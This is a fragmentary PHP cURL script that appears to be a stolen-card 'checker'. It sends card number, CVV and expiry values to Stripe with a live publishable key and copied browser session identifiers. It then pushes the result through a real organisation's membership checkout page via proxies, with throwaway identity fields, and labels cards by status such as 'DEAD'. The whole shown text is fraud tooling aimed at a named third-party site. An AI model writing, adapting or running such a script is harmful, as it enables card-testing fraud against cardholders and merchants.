...
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/api7/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/api7/cookie.txt');

# ----------------- [1REQ POSTFIELDS] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=92d31251-18b8-45ef-8984-46772e839e9f4d7ad4&muid=8c3cdd27-8c90-46be-8e25-42a45f8eaec990ac4d&sid=922d2334-e9d9-4be2-8f43-2daf92f775bfa5688f&payment_user_agent=stripe.js%2F0663df7b8%3B+stripe-js-v3%2F0663df7b8&time_on_page=6235&key=pk_live_vFV7m35XaZT0pvpmsTtlS1v9');
...
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$webshareuser:$websharepass");
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://awlcalgary.ca/membership-account/membership-checkout/?level=5');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/api7/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: awlcalgary.ca' ,
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' ,
'accept-language: en-US,en;q=0.9' ,
'cache-control: max-age=0' ,
'content-type: application/x-www-form-urlencoded' ,
'cookie: ppwp_wp_session=5d4e6ae06c8a65a24d76c2cddf60ba53%7C%7C1670939905%7C%7C1670939545; PHPSESSID=d9f87ad4fe226994e4efff0bcd532638; pmpro_visit=1; __stripe_mid=8c3cdd27-8c90-46be-8e25-42a45f8eaec990ac4d; __stripe_sid=922d2334-e9d9-4be2-8f43-2daf92f775bfa5688f' ,
'origin: https://awlcalgary.ca' ,
'referer: https://awlcalgary.ca/membership-account/membership-checkout/?level=5' ,
'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"' ,
'sec-ch-ua-mobile: ?1' ,
'sec-ch-ua-platform: "Android"' ,
...
curl_setopt($ch, CURLOPT_POSTFIELDS,'level=5&checkjavascript=1&username='.$firstname.''.$firstname.'&password='.$email.'&password2='.$email.'&first_name='.$firstname.'&last_name='.$lastname.'&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&firm_name='.$firstname.'&firm_address='.$zip.'+'.$firstname.'&firm_city=New+York+&firm_province=New+York+&firm_postal='.$zip.'&year_of_call=2000&practice_type=Large+Firm&other_practice_type=&mentor=1&mentor_checkbox=1&mentee_checkbox=1&mentee_mentee_info=&CardType=visa&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX6032&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
...
elseif 
(strpos($result1,  '-1')) {
  echo "┠ Status ⇝ DEAD ✘ Resp ⇝ UPDATE NONCE! ❌   <br>";
}
